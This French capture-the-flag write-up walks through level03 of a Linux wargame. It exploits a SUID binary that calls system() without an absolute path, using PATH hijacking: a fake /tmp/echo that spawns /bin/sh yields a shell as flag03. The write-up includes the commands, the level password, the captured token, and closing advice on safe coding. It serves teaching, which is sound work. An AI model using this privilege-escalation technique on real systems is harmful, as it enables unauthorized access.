L’objectif de ce niveau est d’exploiter une mauvaise configuration des permissions (SUID/SGID) combinée à une mauvaise pratique de programmation (system()) afin d’obtenir des privilèges élevés.

🎯 Objectif du level

Exécuter un binaire vulnérable
Obtenir un shell avec les droits de l’utilisateur flag03
Récupérer le mot de passe pour accéder au level04

🔐 Accès initial

Utilisateur : level03
Mot de passe : kooda2puivaav1idi4f57q8iq

🔍 Analyse du binaire
ls
file level03
Le fichier level03 est un binaire ELF exécutable.
ls -l level03

Permissions :

-rwsr-sr-x 1 flag03 level03 level03

Interprétation des permissions
SUID (rws) : le programme s’exécute avec l’identité de son propriétaire (flag03)
SGID (r-s) : le programme s’exécute avec le groupe level03
Cela signifie que toute commande exécutée par ce programme hérite de privilèges élevés.

⚠️ Vulnérabilité identifiée

Analyse du contenu du binaire :

strings level03 | grep system
Le programme utilise la fonction system().

Problème de sécurité
system() exécute des commandes via le shell
La commande appelée n’utilise pas de chemin absolu
Le programme fait confiance à la variable d’environnement PATH

system() lance un shell qui utilise la variable d’environnement PATH pour trouver echo.
system() → shell → PATH → exécution de la commande.

➡️ Vulnérabilité de type PATH hijacking

💥 Exploitation
1️⃣ Création d’une commande malveillante
cd /tmp
echo '#!/bin/sh
/bin/sh' > echo
chmod +x echo


Le répertoire /tmp est accessible en écriture pour tous les utilisateurs.

2️⃣ Modification de la variable PATH
export PATH=/tmp:$PATH


Ainsi, le système cherchera d’abord la commande echo dans /tmp.

3️⃣ Exécution du binaire vulnérable
./level03


Le programme exécute alors notre faux echo, ce qui ouvre un shell.

🧪 Vérification des privilèges
id
Résultat attendu :
uid=3003(flag03) gid=2003(level03)

🔑 Récupération du mot de passe

Pour connaître le répertoire personnel de flag03 :
getent passwd flag03
Lecture du mot de passe :

cat /home/user/flag03/README.txt

🏁 Résultat

Token récupéré :
qi0maab88jeaj46qoumi7maus

Level03 validé

🧠 Leçon de sécurité

Ce niveau illustre une règle essentielle :

Un programme SUID ne doit jamais appeler system() sans chemin absolu.

Bonnes pratiques :

utiliser des chemins absolus (/bin/echo)
nettoyer l’environnement (PATH)
éviter system() au profit de fonctions plus sûres (execve)

📚 Concepts abordés

SUID / SGID
Permissions Linux
Variable d’environnement PATH
Vulnérabilité de type PATH hijacking
Analyse de binaire ELF
